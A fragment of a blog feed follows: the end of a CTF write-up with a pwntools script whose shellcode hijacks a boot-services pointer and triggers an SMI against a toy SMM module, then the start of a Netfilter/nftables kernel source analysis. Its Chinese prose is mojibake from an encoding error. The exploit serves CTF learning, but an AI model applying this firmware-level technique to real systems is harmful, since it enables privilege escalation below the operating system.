p.sendlineafter(a, b)<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>smm_buffer = <span class="hljs-number">0x6ad9380</span><br>guid = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;1EF11CB3F3B786EC72088E54B1F4769D&#x27;</span>)<br>CommBuffer_offset = <span class="hljs-number">56</span><br>BufferSize_offset = CommBuffer_offset + <span class="hljs-number">8</span><br>ReturnStatus_offset = BufferSize_offset + <span class="hljs-number">8</span><br>bootservice = <span class="hljs-number">0x6FD6B80</span><br>backdoor = <span class="hljs-number">0x7F06000</span><br>payload = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">              </span><br><span class="hljs-string">mov rcx, 0x6FD6B80/* gBS-&gt;LocateProtocol = PrintFlag */</span><br><span class="hljs-string">add rcx, 0x140</span><br><span class="hljs-string">mov rdx, 0x7F06000</span><br><span class="hljs-string">mov [rcx], rdx</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rcx, 0x6ad9400/* CommBuffer-&gt;HeaderGuid = ToySmmGuid */</span><br><span class="hljs-string">mov rdx, 0xEC86B7F3B31CF11E</span><br><span class="hljs-string">mov [rcx], rdx</span><br><span class="hljs-string">add rcx, 8</span><br><span class="hljs-string">mov rdx, 0x9D76F4B1548E0872</span><br><span class="hljs-string">mov [rcx], rdx</span><br><span class="hljs-string">add rcx, 8/* CommBuffer-&gt;MessageLength = 4 */</span><br><span class="hljs-string">mov rdx, 0x4</span><br><span class="hljs-string">mov [rcx], rdx</span><br><span class="hljs-string">add rcx, 24/* CommBuffer-&gt;Data[24] = &#x27;AAAA&#x27; */</span><br><span class="hljs-string">mov rdx, 0x41414141</span><br><span class="hljs-string">mov [rcx], rdx</span><br><span class="hljs-string">add rcx, 8</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov rcx, 0x6ad93b8/* mSmmCorePrivateData-&gt;CommunicationBuffer = CommBuffer */</span><br><span class="hljs-string">mov rdx, 0x6ad9400</span><br><span class="hljs-string">mov [rcx], rdx</span><br><span class="hljs-string">add rcx, 8/* mSmmCorePrivateData-&gt;BufferSize = 0x1c */</span><br><span class="hljs-string">mov rdx, 0x1c</span><br><span class="hljs-string">mov [rcx], rdx</span><br><span class="hljs-string"></span><br><span class="hljs-string">xor eax, eax/* SMI */</span><br><span class="hljs-string">mov dx, 0xb2</span><br><span class="hljs-string">mov al, 0x00</span><br><span class="hljs-string">outb dx, al</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>ru(<span class="hljs-string">&#x27;Your shellcode:&#x27;</span>)<br>raw_input(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>sl(payload.<span class="hljs-built_in">hex</span>())<br>sl(<span class="hljs-string">&quot;DONE&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nftæºç åˆ†æ</title>
    <link href="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <url>/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>éå¸¸å¥½nftï¼ŒL3HCTFè§åˆ°äº†ï¼Œå­¦ä¹‹ğŸ‘ˆ</p><span id="more"></span><h1 id="Netfilter"><a href="#Netfilter" class="headerlink" title="Netfilter"></a>Netfilter</h1><p><strong>Netfilter</strong> é€šè¿‡åœ¨ç½‘ç»œåè®®æ ˆçš„ä¸åŒé˜¶æ®µæ³¨å†Œé’©å­å‡½æ•°æ¥å®ç°å¯¹æ•°æ®åŒ…çš„å¤„ç†ä¸è¿‡æ»¤ï¼Œè¿‡æ»¤ä½äº <strong>IP</strong> å±‚</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/ip.png" class title="ip"><ul><li><p>Netfilteræä¾›äº†5ä¸ªHOOKç‚¹ï¼ˆåŒ…å¤„ç†çš„ä¸åŒé˜¶æ®µï¼‰ï¼ŒåŒºåˆ†çš„é‡è¦èŠ‚ç‚¹æ˜¯ <strong>è·¯ç”±åˆ¤å†³</strong>ï¼ˆæ˜¯å‘å¾€æœ¬åœ°çš„åŒ…è¿˜æ˜¯ä¸­è½¬çš„åŒ…ï¼‰</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/hook.png" class title="hook"><ul><li><strong>PRE_ROUTING</strong>ï¼šåˆšæ”¶åˆ°åŒ…ï¼Œè·¯ç”±åˆ¤æ–­å‰</li><li><strong>LOCAL_IN</strong>ï¼šè·¯ç”±åˆ¤å†³ç»“æŸï¼Œæ˜¯å‘å¾€æœ¬åœ°çš„åŒ…</li><li><strong>FORWARD</strong>ï¼šè·¯ç”±åˆ¤å†³ç»“æŸï¼Œæ˜¯ä¸­è½¬çš„åŒ…</li><li><strong>LOCAL_OUT</strong>ï¼šè·¯ç”±åˆ¤å†³å‰ï¼Œæœ¬åœ°è¦å‘å‡ºçš„åŒ…</li><li><strong>POST_ROUTING</strong>ï¼šè·¯ç”±åˆ¤å†³åï¼Œå‘å‡ºçš„åŒ…</li></ul></li><li><p>å®é™…ä¸Šä¸åŒçš„åè®®hookç•¥æœ‰åŒºåˆ«</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/hooks.png" class title="hooks"><p>æºç ä¸­æœ‰ç›¸å…³çš„å®šä¹‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nf_inet_hooks</span> &#123;</span><br>NF_INET_PRE_ROUTING,<br>NF_INET_LOCAL_IN,<br>NF_INET_FORWARD,<br>NF_INET_LOCAL_OUT,<br>NF_INET_POST_ROUTING,<br>NF_INET_NUMHOOKS,<br>NF_INET_INGRESS = NF_INET_NUMHOOKS,<br>&#125;;<br><br><span class="hljs-comment">/* ARP Hooks */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NF_ARP_IN0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NF_ARP_OUT1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NF_ARP_FORWARD2</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="hookæŒ‚è½½ï¼šNF-INET-XXX"><a href="#hookæŒ‚è½½ï¼šNF-INET-XXX" class="headerlink" title="hookæŒ‚è½½ï¼šNF_INET_XXX"></a>hookæŒ‚è½½ï¼šNF_INET_XXX</h2><p>å…ˆåº·åº·åœ¨å“ªäº›å‡½æ•°é‡Œè°ƒç”¨äº†hookå‡½æ•°</p><p>é™„ä¸€å¼ IPv4çš„å‡½æ•°è°ƒç”¨å…³ç³»å›¾</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/function.png" class title="function"><ul><li><p>NF_INET_PRE_ROUTING</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * IP receive entry point</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">ip_rcv</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb, <span class="hljs-keyword">struct</span> net_device *dev, <span class="hljs-keyword">struct</span> packet_type *pt,</span><br><span class="hljs-params">   <span class="hljs-keyword">struct</span> net_device *orig_dev)</span><br>&#123;<br>    <span class="hljs-comment">/* IPæ•°æ®æŠ¥çš„åˆæ³•æ€§æ£€æŸ¥å’Œä¸€äº›å¿…è¦å­—æ®µè®¾ç½® */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span> *<span class="hljs-title">net</span> =</span> dev_net(dev);<br><br>skb = ip_rcv_core(skb, net);<br><span class="hljs-keyword">if</span> (skb == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span> NET_RX_DROP;<br><br>    <span class="hljs-comment">/* ç»è¿‡NF_INET_PRE_ROUTING hookç‚¹ */</span><br><span class="hljs-keyword">return</span> NF_HOOK(NFPROTO_IPV4, NF_INET_PRE_ROUTING,<br>       net, <span class="hljs-literal">NULL</span>, skb, dev, <span class="hljs-literal">NULL</span>,<br>       ip_rcv_finish);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>NF_INET_LOCAL_IN</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">ip_local_deliver</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb)</span><br>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *åˆ†ç‰‡é‡ç»„</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span> *<span class="hljs-title">net</span> =</span> dev_net(skb-&gt;dev);<br><br><span class="hljs-keyword">if</span> (ip_is_fragment(ip_hdr(skb))) &#123;<br><span class="hljs-keyword">if</span> (ip_defrag(net, skb, IP_DEFRAG_LOCAL_DELIVER))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>    <span class="hljs-comment">/* ç»è¿‡NF_INET_LOCAL_IN hookç‚¹ */</span><br><span class="hljs-keyword">return</span> NF_HOOK(NFPROTO_IPV4, NF_INET_LOCAL_IN,<br>       net, <span class="hljs-literal">NULL</span>, skb, skb-&gt;dev, <span class="hljs-literal">NULL</span>,<br>       ip_local_deliver_finish);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>NF_INET_FORWARD</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">ip_forward</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb)</span><br>&#123;<br>    <br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * åˆæ³•æ€§æ£€æŸ¥</span><br><span class="hljs-comment">     */</span><br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *é€’å‡TTLï¼Œåˆ¤æ–­æ˜¯å¦éœ€è¦icmp</span><br><span class="hljs-comment"> */</span><br><br>    <span class="hljs-comment">/* ç»è¿‡NF_INET_FORWARD hookç‚¹ */</span><br><span class="hljs-keyword">return</span> NF_HOOK(NFPROTO_IPV4, NF_INET_FORWARD,<br>       net, <span class="hljs-literal">NULL</span>, skb, skb-&gt;dev, rt-&gt;dst.dev,<br>       ip_forward_finish);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">  * é”™è¯¯å¤„ç†</span><br><span class="hljs-comment">  */</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>NF_INET_LOCAL_OUT</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __ip_local_out(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-keyword">struct</span> sk_buff *skb)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iphdr</span> *<span class="hljs-title">iph</span> =</span> ip_hdr(skb);<br><br>    <span class="hljs-comment">/* è®¡ç®—æ€»é•¿åº¦ */</span><br>iph-&gt;tot_len = htons(skb-&gt;len);<br><span class="hljs-comment">/* è®¡ç®—æ ¡éªŒå’Œ */</span><br>    ip_send_check(iph);<br><br><span class="hljs-comment">/* if egress device is enslaved to an L3 master device pass the</span><br><span class="hljs-comment"> * skb to its handler for processing</span><br><span class="hljs-comment"> */</span><br>skb = l3mdev_ip_out(sk, skb);<br><span class="hljs-keyword">if</span> (unlikely(!skb))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* è®¾ç½®ipåè®® */</span><br>skb-&gt;protocol = htons(ETH_P_IP);<br><br>    <span class="hljs-comment">/* ç»è¿‡NF_INET_LOCAL_OUT hookç‚¹ */</span><br><span class="hljs-keyword">return</span> nf_hook(NFPROTO_IPV4, NF_INET_LOCAL_OUT,<br>       net, sk, skb, <span class="hljs-literal">NULL</span>, skb_dst(skb)-&gt;dev,<br>       dst_output);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>NF_INET_POST_ROUTING</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">ip_output</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-keyword">struct</span> sk_buff *skb)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_device</span> *<span class="hljs-title">dev</span> =</span> skb_dst(skb)-&gt;dev, *indev = skb-&gt;dev;<br><br>IP_UPD_PO_STATS(net, IPSTATS_MIB_OUT, skb-&gt;len);<br><br>    <span class="hljs-comment">/* è¾“å‡ºè®¾å¤‡å’Œåè®® */</span><br>skb-&gt;dev = dev;<br>skb-&gt;protocol = htons(ETH_P_IP);<br><br>    <span class="hljs-comment">/* ç»è¿‡NF_INET_POST_ROUTING hookç‚¹ */</span><br><span class="hljs-keyword">return</span> NF_HOOK_COND(NFPROTO_IPV4, NF_INET_POST_ROUTING,<br>    net, sk, skb, indev, dev,<br>    ip_finish_output,<br>    !(IPCB(skb)-&gt;flags &amp; IPSKB_REROUTED));<br>&#125;<br>EXPORT_SYMBOL(ip_output);<br></code></pre></td></tr></table></figure></li></ul><p>å†æ”¾ä¸¤å¼ bridgeçš„hookç‚¹çš„å›¾</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/bridge1.png" class title="bridge1"><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/bridge2.png" class title="bridge2"><h2 id="hookæ‰§è¡Œï¼šNF-HOOK"><a href="#hookæ‰§è¡Œï¼šNF-HOOK" class="headerlink" title="hookæ‰§è¡Œï¼šNF_HOOK"></a>hookæ‰§è¡Œï¼šNF_HOOK</h2><p>çœ‹çœ‹NF_HOOKå‡½æ•°æ˜¯æ€ä¹ˆæ‰§è¡Œæ³¨å†Œçš„è¿‡æ»¤å‡½æ•°çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span><br><span class="hljs-title function_">NF_HOOK</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> pf, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> hook, <span class="hljs-keyword">struct</span> net *net, <span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-keyword">struct</span> sk_buff *skb,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> net_device *in, <span class="hljs-keyword">struct</span> net_device *out,</span><br><span class="hljs-params"><span class="hljs-type">int</span> (*okfn)(<span class="hljs-keyword">struct</span> net *, <span class="hljs-keyword">struct</span> sock *, <span class="hljs-keyword">struct</span> sk_buff *))</span><br>&#123;<br><span class="hljs-type">int</span> ret = nf_hook(pf, hook, net, sk, skb, in, out, okfn);<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">1</span>)<br>ret = okfn(net, sk, skb);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>è°ƒç”¨nf_hookæ‰§è¡Œhookï¼ŒæˆåŠŸåˆ™æ‰§è¡Œæ¥ä¸‹æ¥è¦æ‰§è¡Œçš„å‡½æ•°okfnï¼Œå¦‚</p><ul><li><strong>ip_rcv</strong> ğŸ‘‰ <strong>ip_rcv_finish</strong></li><li><strong>ip_local_deliver</strong> ğŸ‘‰ <strong>ip_local_deliver_finish</strong></li><li><strong>ip_forward</strong> ğŸ‘‰ <strong>ip_forward_finish</strong></li><li><strong>ip_output</strong> ğŸ‘‰ <strong>ip_output_finish</strong></li></ul><p>è¯¦æƒ…å¯è§ğŸ‘†å‡½æ•°è°ƒç”¨å›¾å’Œhookç‚¹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nf_hook</span><span class="hljs-params">(<span class="hljs-type">u_int8_t</span> pf, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> hook, <span class="hljs-keyword">struct</span> net *net,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> sock *sk, <span class="hljs-keyword">struct</span> sk_buff *skb,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> net_device *indev, <span class="hljs-keyword">struct</span> net_device *outdev,</span><br><span class="hljs-params">  <span class="hljs-type">int</span> (*okfn)(<span class="hljs-keyword">struct</span> net *, <span class="hljs-keyword">struct</span> sock *, <span class="hljs-keyword">struct</span> sk_buff *))</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_entries</span> *<span class="hljs-title">hook_head</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">int</span> ret = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 1. ä¼˜åŒ–ä¸€äº›å‡ ä¹å§‹ç»ˆä¸ºçœŸæˆ–è€…å§‹ç»ˆä¸ºå‡çš„åˆ†æ”¯</span><br><span class="hljs-comment">     */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_JUMP_LABEL</span><br><span class="hljs-keyword">if</span> (__builtin_constant_p(pf) &amp;&amp;<br>    __builtin_constant_p(hook) &amp;&amp;<br>    !static_key_false(&amp;nf_hooks_needed[pf][hook]))<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 2. ä»å¯¹åº”namespaceä¸­å–å¯¹åº”hookç‚¹çš„hooké“¾</span><br><span class="hljs-comment">     */</span><br>rcu_read_lock();<br><span class="hljs-keyword">switch</span> (pf) &#123;<br><span class="hljs-keyword">case</span> NFPROTO_IPV4:<br>hook_head = rcu_dereference(net-&gt;nf.hooks_ipv4[hook]);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> NFPROTO_IPV6:<br>hook_head = rcu_dereference(net-&gt;nf.hooks_ipv6[hook]);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> NFPROTO_ARP:<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NETFILTER_FAMILY_ARP</span><br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(hook &gt;= ARRAY_SIZE(net-&gt;nf.hooks_arp)))<br><span class="hljs-keyword">break</span>;<br>hook_head = rcu_dereference(net-&gt;nf.hooks_arp[hook]);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> NFPROTO_BRIDGE:<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NETFILTER_FAMILY_BRIDGE</span><br>hook_head = rcu_dereference(net-&gt;nf.hooks_bridge[hook]);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> IS_ENABLED(CONFIG_DECNET)</span><br><span class="hljs-keyword">case</span> NFPROTO_DECNET:<br>hook_head = rcu_dereference(net-&gt;nf.hooks_decnet[hook]);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">default</span>:<br>WARN_ON_ONCE(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 3. è°ƒç”¨nf_hook_slowæ‰§è¡Œhooké“¾</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">if</span> (hook_head) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_state</span> <span class="hljs-title">state</span>;</span><br><br>nf_hook_state_init(&amp;state, hook, pf, indev, outdev,<br>   sk, net, okfn);<br><br>ret = nf_hook_slow(skb, &amp;state, hook_head, <span class="hljs-number">0</span>);<br>&#125;<br>rcu_read_unlock();<br><br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>CONFIG_JUMP_LABELçš„å®šä¹‰ï¼Œç®€å•è¯´å°±æ˜¯ä¼˜åŒ–ä¸€äº›å‡ ä¹ä¸ºçœŸ &#x2F; å‡çš„åˆ†æ”¯ï¼ŒåŠ å¿«æ‰§è¡Œé€Ÿåº¦</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c">config JUMP_LABEL<br><span class="hljs-type">bool</span> <span class="hljs-string">&quot;Optimize very unlikely/likely branches&quot;</span><br>depends on HAVE_ARCH_JUMP_LABEL<br>depends on CC_HAS_ASM_GOTO<br>help<br> This option enables a transparent branch optimization that<br> makes certain almost-always-<span class="hljs-literal">true</span> or almost-always-<span class="hljs-literal">false</span> branch<br> conditions even cheaper to execute within the kernel.<br><br> Certain performance-sensitive kernel code, such as trace points,<br> scheduler functionality, networking code and KVM have such<br> branches and include support <span class="hljs-keyword">for</span> this optimization technique.<br><br> If it is detected that the compiler has support <span class="hljs-keyword">for</span> <span class="hljs-string">&quot;asm goto&quot;</span>,<br> the kernel will compile such branches with just a nop<br> instruction. When the condition flag is toggled to <span class="hljs-literal">true</span>, the<br> nop will be converted to a jump instruction to execute the<br> conditional block of instructions.<br><br> This technique lowers overhead and stress on the branch prediction<br> of the processor and generally makes the kernel faster. The update<br> of the condition is slower, but those are always very rare.<br><br> ( On <span class="hljs-number">32</span>-bit x86, the necessary options added to the compiler<br>   flags may increase the size of the kernel slightly. )<br></code></pre></td></tr></table></figure></li><li><p>é«˜ç‰ˆæœ¬çš„nf_hookä¸æ˜¯å…¨å±€å‚¨å­˜çš„ï¼Œè€Œæ˜¯æ³¨å†Œåœ¨network namespaceä¸­ï¼Œnetç»“æ„ä½“è¡¨ç¤ºnetwork namespace</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span> &#123;</span><br>    <br>    <br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NETFILTER</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">netns_nf</span><span class="hljs-title">nf</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(CONFIG_NF_CONNTRACK) || defined(CONFIG_NF_CONNTRACK_MODULE)</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">netns_ct</span><span class="hljs-title">ct</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(CONFIG_NF_TABLES) || defined(CONFIG_NF_TABLES_MODULE)</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">netns_nftables</span><span class="hljs-title">nft</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><p>netns_nfå‚¨å­˜äº†ä¸åŒåè®®çš„hooké“¾</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">netns_nf</span> &#123;</span><br><br>    <br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_entries</span> __<span class="hljs-title">rcu</span> *<span class="hljs-title">hooks_ipv4</span>[<span class="hljs-title">NF_INET_NUMHOOKS</span>];</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span 